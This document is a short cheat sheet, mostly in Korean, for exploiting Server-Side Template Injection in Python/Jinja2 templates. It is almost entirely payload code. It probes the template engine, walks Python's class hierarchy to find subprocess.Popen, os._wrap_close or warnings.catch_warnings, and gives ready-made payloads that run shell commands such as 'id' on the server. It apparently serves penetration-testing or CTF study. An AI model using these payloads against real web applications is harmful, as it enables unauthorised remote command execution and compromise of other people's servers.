SSTI(Server-Side Template Injection)

payload
```c
{{ "".__class__ }}
```
if res is <class 'str'> than try ssti
```c
{{ "".__class__.__mro__}}
```

최상위 클래스로 이동 -> <class 'str'>,<class 'object'> 가 나오면 우린 object를 골라야하니까
```c
{{ "".__class__.__mro__[1]}}
```
object를 골라주고

```c
{{ "".__class__.__mro__[1].__subclasses__() }}
```
하위 클래스 전부열어주기 이러면 엄청나게 많은 class들이나옴
여기서 유의미한 class를 찾는다


---

```c
{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if "Popen" in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```

subprocess.Popen 번호 찾는구문

```c
{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if "_wrap_close" in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```
os._wrap_close 번호 찾는구문

```c
{% for c in "".__class__.__mro__[1].__subclasses__() %}{% if "catch_warnings" in c.__name__ %}{{ loop.index0 }}{% endif %}{% endfor %}
```
warnings.catch_warnings 번호 찾는구문

---

각각 함수별 payload 삽입 방법

subprocess.Popen 의 번호가 356일경우 아래 payload로 삽입하면된다
```c
{{ "".__class__.__mro__[1].__subclasses__()[356]('id', shell=True, stdout=-1).communicate() }}
```


os._wrap_close 번호가 132일경우
```c
{{ "".__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('id').read() }}
```


warnings.catch_warning번호가 221일경우
```c
{{ "".__class__.__mro__[1].__subclasses__()[221].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

